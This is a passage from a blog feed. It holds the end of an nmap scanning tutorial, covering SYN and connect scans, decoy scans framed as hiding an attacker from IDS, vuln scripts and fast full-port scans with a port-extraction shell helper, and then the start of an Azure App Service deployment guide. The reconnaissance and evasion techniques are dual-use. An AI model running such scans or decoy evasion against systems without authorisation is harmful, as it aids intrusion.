&lt;p&gt;As we have seen above we can specify the scan time. But we also have another option that can optimize the scanning process even more. For example the parameter “–min-rate” we can indicate how many packets we want to emit per second.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura42.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;There are several parameters that I have not mentioned but that can be useful in certain situations.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura37.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;difference-between-tcp-connect-scan-and-syn-scan&quot;&gt;Difference between TCP connect scan and SYN scan&lt;/h2&gt;

&lt;p&gt;Before using these types of scanning we must know how the TCP protocol works, the TCP protocol (Transmission Control Protocol) for example if we want to access a web site from our computer to the server where the web site is hosted, tcp allows how we must start the communication and how we can access that page. the rules that the tcp protocol uses to start a communication is with “3 wey handshake”. first the client sends a request called “syn”, the server resive the request and responds by sending the client a packet called “syn ack” and then the client sends another packet called “ack” so that the server receives the message that the client is successfully communicating with the server.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/tcp.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Scan specific ports on the subnet to see if any hosts within the subnet have open ports 80 and 443 via tcp. With the “-sT” parameter we specify that we are going to use the full TCP connection (full open scan), and the magic of this is with the TCP protocol using the “3 way handshake”. using the 3 wey handshake nmap can find out if the ports are open or not.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura17.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;The problem with parameter types such as “-sT” is that we are indicating that we want to tcp the connection, and this can cause a lot of noise in the network and be detected by IDS.&lt;/p&gt;

&lt;p&gt;To avoid this type of problems we are going to use the same command but with the parameter “-sS”, this parameter comes from “stealthy” this type of scanning is known as “syn scan” or “half-open scan”. with this parameter we indicate that we do not want the whole process of communication with tcp, as we have seen to communicate through tcp we have to complete the “3 way handshake” to establish the connection, if it does not complete these three processes there will be no connection. But still if the server has well configured firewall we can be detected, but with this parameter at least we avoid that problem a little.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura18.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to use these two commands again, but we are going to look at the traffic using wireshark.&lt;/p&gt;

&lt;p&gt;Let’s use the “-sT” parameter to indicate all tcp scanning. If we do not specify the ports nothing happens, since by default if you do not specify it nmap scans the 1000 most common ports.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura19.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Campturing the packages in wireshark:&lt;/p&gt;

&lt;p&gt;First I send a “syn” packet, then the server sends me back a “syn ack” packet (to tell the client that it can communicate with port 443) and once the client receives it, it sends another “ack” packet (to tell the server that it can communicate perfectly). And the “rst, ack” means that this is the end of the communication. As we can see, the “3 wey handshake” has been successfully completed.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura20.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now let’s try with the parameter “-sS”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura21.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Campturing the packages in wireshark:&lt;/p&gt;

&lt;p&gt;First the client sends a “syn” packet, the server replies with “syn. Ack” (telling the client that it can communicate in the port 443), and the communication is finished. In this case it does not comply with the “3 wey handshake” rule because the client does not send the “ack” packet to verify it. And with this we more or less avoid making a lot of noise on the network and being discovered by the firewall.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura22.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;we are going to use a parametor that is a bit similar “-sS”. With the parameter “-D (Cover up a scan with decoys)”, allows us to cover our traffic to not be discovered easily. As I said before if we are attackers and we are scanning a network and we are sending all that traffic we will make a lot of noise in the network, combining with the parameter “-sS”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/decoy.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;What we have done with the previous command is to send a packet of “syn (-sS)”, but what we do is that there is another host that sends the same packet at the same time changing the ip which in this case is 10.10.16.8, and if someone is looking at the network traffic will see many hots sending that packet and will not know who is sending all those packets over the network, and this as an attacker helps us to cover up.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura23.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In wireshark we can see that the packet has been sent at the same time with a duplicate, in my case I have added only one ip, but if we want we can specify ip ranges and more hosts would appear sending the same packet and it would be more difficult to find which computer is sending that traffic.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura25.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;nmap-script&quot;&gt;Nmap script&lt;/h2&gt;

&lt;p&gt;We can run custom scripts in nmap to find vulnerabilities in certain services. For example with the “-sC” parameter we can launch basic port scanning scripts, etc. If we go to the scripting section in the nmap documentation we can see the options we have.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura38.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;From the official nmap site there are many categories of scripting that can help us a lot when doing some kind of audit. For example in the “vuln (vulnerabilities)” section we can scan a host and see which ports are open or filtered and report us through the console if some of the ports that run certain services are vulnerable that we can exploit.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura39.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;With the parameter “-script” we are going to specify which script we are going to use, in my case I have put “vuln” with this I specify that it uses all the scripts of the vuln category, but with this it takes more time the scanning and it tends to make noise in the network. But we can specify script that you need and we will go even faster. As we can see it has reported me in the terminal the vulnerability that we can exploit in the ports that has been scanned.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura40.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we see that there is an open http port with nmap we can apply fuzzing along with an nmap dictionary of possible routes. There are several better tools for fuzzing, but nmap also has a built-in script for this task even if it is not very useful.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/http-enum.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;useful-set-of-parameters&quot;&gt;Useful set of parameters&lt;/h2&gt;

&lt;p&gt;First of all, I have used the parameter “-p-“ to scan all the existing port ranges, which are 65535 ports in total, with this parameter is a way to indicate it. We can use the other option of this parameter which is “-p1-65535”.&lt;/p&gt;

&lt;p&gt;And the parameter “–open” is to indicate that we want to report in the terminal the ports that are in open status not filtered in the tcp protocol.&lt;/p&gt;

&lt;p&gt;With the parameter “-T” is to control the timing and the performance of our scan, as I said before the faster we want our scan to go the more noise we are going to generate in the network.&lt;/p&gt;

&lt;p&gt;And the “-v” parameter of verbose indicates that we want to report information during the scanning process.&lt;/p&gt;

&lt;p&gt;And the parameter “-n” we specify that we don’t want dns resolution, if we don’t indicate it there are occasions that the dns resolution takes more than 1 min.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura43.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we want to go even faster and speed up the scanning process we can use the following parameters. With the “-sS” parameter we indicate a “tcp syn port scan” as I have already indicated what this parameter deos. And with the parameter “–min-rate [number of packets]” to indicate that I want to send packets no slower than 5000 packets per second, with this we get that our scan goes faster and with this combination we don’t need to use the parameter “-T”.&lt;/p&gt;

&lt;p&gt;With the parameter “-vvv (verbose)” I am indicating that I want more information. And with the parameter “-Pn” we indicate that we don’t want host discovery through the arp address resolution protocol. And with the parameter “-oG” we indicate in which format we want to save the evidences and the file name.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura44.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we do a “cat” to the file we can see that the nmap capture is saved.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura45.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In this case I used this format because I have a utility in the “~/.zshrc” file that shows me the available ports and ip in a more elegant way and copies the range of ports to the clipboard.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura46.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To copy the function:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;extractPorts&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{1,5}/open'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; | xargs | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;ip_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Extracting information...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] IP Address: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip_address&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Open ports: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ports&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ports&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; | xclip &lt;span class=&quot;nt&quot;&gt;-sel&lt;/span&gt; clip
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Ports copied to clipboard&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; extractPorts.tmp
        &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;extractPorts.tmp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;extractPorts.tmp
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the “-sC” parameter we tell it to run some basic recon scripts. With the “-sV” parameter, we tell it to report the version of the services, this parameter can be used with the other “-sCV” to speed up the process even more. I indicate the ports that I have just discovered and I want to save the evidence with the nmap format “-oN” to the targeted file.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura47.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see, the evidence has been saved correctly.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-nmap/captura48.png&quot; /&gt;
&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Nmap" /><category term="Linux" /><category term="Hack the box" /><summary type="html">we are going to learn how to scan a network or a host using nmap, we are going to see some simple nmap commands and commands that help us to pentest.</summary></entry><entry><title type="html">Azure - Appservice</title><link href="http://localhost:4000/azure-appservice/" rel="alternate" type="text/html" title="Azure - Appservice" /><published>2021-10-24T00:00:00+02:00</published><updated>2021-10-24T00:00:00+02:00</updated><id>http://localhost:4000/azure-appservice</id><content type="html" xml:base="http://localhost:4000/azure-appservice/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/appservice.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to learn how the app service works and the possibilities it offers us to manage the hosting since the app service is still a hosting but the difference is that we can manage it.&lt;/p&gt;

&lt;p&gt;In this article we are going to learn:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What is app service and azure concepts&lt;/li&gt;
  &lt;li&gt;How to create a resource group&lt;/li&gt;
  &lt;li&gt;Create an App service plan&lt;/li&gt;
  &lt;li&gt;Creat a appservice in azure&lt;/li&gt;
  &lt;li&gt;Deploy our web app in the multiple ways:
    &lt;ul&gt;
      &lt;li&gt;Deploying with ftp&lt;/li&gt;
      &lt;li&gt;Deploying with our github repository&lt;/li&gt;
      &lt;li&gt;Deploying with bitbuket&lt;/li&gt;
      &lt;li&gt;Deploying with git local&lt;/li&gt;
      &lt;li&gt;Deploying with azure repo&lt;/li&gt;
      &lt;li&gt;Deploying with vs code 2019
        &lt;ul&gt;
          &lt;li&gt;Push our repo in github in vs code 2019&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Deploying with vs code&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Create appservice with azure start devops&lt;/li&gt;
  &lt;li&gt;Some azure CLI commands&lt;/li&gt;
  &lt;li&gt;Create an app service inside a container
    &lt;ul&gt;
      &lt;li&gt;Create an webhook&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Sorry for the screenshots that are in Spanish, I have not been able to make the guide again since my azure subscription has expired. But the process is the same.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;what-is-app-service&quot;&gt;What is app service?&lt;/h2&gt;

&lt;p&gt;App service is a fully managed web hosting service for building web applications, services and RESTful APIs. The service offers a variety of plans to meet the needs of any application, from small web sites to worldwide web applications.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/azure-app-service-diagram.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In azure there are three models of cloud computing offered to us as a service, and each one covers some degree of management and this includes other cloud providers, which is the iaaS, PaaS and SaaS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;iaaS&lt;/em&gt;&lt;/strong&gt;: this service manage virtual machines and storage in the cloud.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;PaaS&lt;/em&gt;&lt;/strong&gt;: It provides operating systems, databases, etc. that you can raise, modify and shut down with a few clicks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;SaaS&lt;/em&gt;&lt;/strong&gt;: Allows users to connect to applications that are in the cloud over the Internet and use them (hosting, outlook, google docs).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/azuremodels.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;There is one important thing we have to keep in mind when using azure is that it charges us for reading data and this includes with other providers.&lt;/p&gt;

&lt;h2 id=&quot;how-to-create-resource-group&quot;&gt;How to create resource group&lt;/h2&gt;

&lt;p&gt;A &lt;strong&gt;&lt;em&gt;resource group&lt;/em&gt;&lt;/strong&gt; allows us to manage resources in a flexible and simple way (vm, web app, databases, networks, etc.) The resource group can include all the resources of the solution or only those that you want to manage as group.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/group.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To create a group of resources, we go to the azure portal and click on the three stripes that appear in the upper left. And then we select a resource group and click on “create” .&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura1.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In case we have other types of azure subscriptions we will select it, and we gon a put name our resource group. It is important to check which region we choose, because depending on the region, there are different costs. And click on “review + finish”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura2.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;create-an-app-service-plan&quot;&gt;Create an app service plan&lt;/h2&gt;

&lt;p&gt;We are going to create a plan for our app service, and when we are going to create a new app service we can select this plan.&lt;/p&gt;

&lt;p&gt;So to create a app service plan, we are going to search “app service plans” in the azure portal navegation bar. Here we are gon a click in “create”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura3.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Here we are going to select our resource group that we have just created, we put the name of our plan, we will choose an operating system this is important since each operating system offers us different functionalities in the app service, we choose a region (it is important to select the region where we are located) and finally we will choose the price plan, there are two price plans that are for testing, which is f1 (which is free) and b2 (which is paid and with more capacity) there are other price plans but we’ll see later.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura4.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;After selecting the sku, we click on “create and review” and a summary of the configuration that we have put in our app service plan will appear. and we click “create” to finish.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura5.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;create-an-app-service&quot;&gt;Create an app service&lt;/h2&gt;

&lt;p&gt;We will type “app service” in the search engine of the azure portal and click on app service.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura6.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Here in the app service panel we are going to click on “create”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura7.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;First we are going to select the group of resources that we have created previously, and then we will put a domain name for our web app. In “publish” we are going to select code, since the second option is if we want our app service to be published within a docker container, but we will see that later.&lt;/p&gt;

&lt;p&gt;Where it says “runtime stack” defines the technology stack used to develop the application, in my case I will choose php 7.3. We choose an OS as I said before, it is important that we select a suitable one for our needs since each OS offers different features in app service.&lt;/p&gt;

&lt;p&gt;We choose a region closer to where we are located and in “plan” we will choose the plan that we created previously, in this case I put another app service plan since the plan that I created previously put the Linux OS. or if we want we can create a plan directly from here by clicking on “creat new”. And to finish we click on “review and finish”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura8.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And here we can see the summary of the configuration that we put to create the app service (if we see any wrong configuration we can go back) and we click on “create” to finish the process.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura9.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to wait for the implementation process of our app service to finish. And once it is finished we click on the notification bell and we click on “go to resource” or from the same panel where it is being deployed.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura10.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are in the overview section of our app service. And we can see we have the domain that we put for our app service, in case if we click on the url the default azure page will appear.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura11.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we go to “Scale up” here we can change our contract plan for our app service.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura12.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we want to upload our app service in production we have other types of plans.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura13.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we go to the configuration of our app service, in “general settings” we can change some settings of our app service in the event that when creating the app service we put some configuration that we didn’t want.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura14.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;deploy-our-web-app-in-the-multiple-ways&quot;&gt;Deploy our web app in the multiple ways:&lt;/h2&gt;

&lt;h3 id=&quot;deploying-with-ftp&quot;&gt;Deploying with ftp:&lt;/h3&gt;

&lt;p&gt;In this case, to deploy our web app we are going to use an ftp client, in this case I am going to use filezilla. but if we want we can use the terminal.&lt;/p&gt;

&lt;p&gt;In my case I am going to upload an html file that I just created.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura15.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;What we are going to do is connect the server to our ftp client. If in your case you are using filezilla, what we are going to do is go to “archives” and click on “site manager”. and we click on “new site” and in this case we are going to put the name of our app service that we just created.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura16.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In the ftp client it will ask us for the name of our server, username and password. for this we go to our app service and we will go where it says “Deployment center” and click on “ftps credentials”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura17.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In the filezilla will are going to copy and paste “ftps endpoint”, copy the username and password and paste in filezilla. and click in “connect”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura18.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If everyting is all right we should get a popup of the ftp certificate that we are using, when we click in “connect”. And click “accept”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura19.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To deploy our web app just where it says “remote site” we go to the path “/site/wwwroot” and here we drag the folder where we have developed our web app. in my case I am just going to upload the html file that I created before.&lt;/p&gt;

&lt;p&gt;where it says “status” we can see if our files have been uploaded correctly to the server.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura20.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If I go to the domain of my app service we can see that the deploy has been done correctly.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura21.png&quot; /&gt;
&lt;/p&gt;

&lt;h3 id=&quot;deploying-with-our-github-repository&quot;&gt;Deploying with our github repository:&lt;/h3&gt;

&lt;p&gt;In my case i have created an repository in my github account, and in that repository i add an html file.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura22.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now what we are going to do is to connect our github account and the repository. for this I am going to use the app service that I have created in azure CLI. To do this we go to our app service, and in “deployment center” -&amp;gt; “settings” -&amp;gt; “source” -&amp;gt; “continuous deployment” we select github.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura23.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Then a popup will appear and we will log in to our github account (in case we are not logged in) and click on “Authorize app service”. And we will have already connected our github account to our app service.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura24.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In organization we are going to select an organization that we have created in github, in my case I don’t have one so I am going to select the name of my account. In “repository” we are going to select the repo where we have uploaded our web app. And select the branch we want, in this case I have selected the “main” branch. And finally we click on “save”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura25.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see, it has been deployed correctly.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura26.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If in case we want another repo in our app service or disconnect our repo. We go to “deployment center” and click on “disconnect”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura27.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we go to “deployment center” it notifies us and tells us the date and time and the user who made a pull request or any modification in the repository (it’s the same feature we have in github).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/registro.png&quot; /&gt;
&lt;/p&gt;

&lt;h3 id=&quot;deploying-with-bitbucket&quot;&gt;Deploying with bitbucket:&lt;/h3&gt;

&lt;p&gt;In bitbucket it is the same process we have done in github to deploy our web app.&lt;/p&gt;

&lt;p&gt;The first thing I have done in bitbucket is create a workspace.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura28.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Then i create a project.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura29.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And then i create a repository in bitbucket.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura30.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Inside the repository I have created an index.html file with the following content.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura31.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Once I finished I made a commit of the changes.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
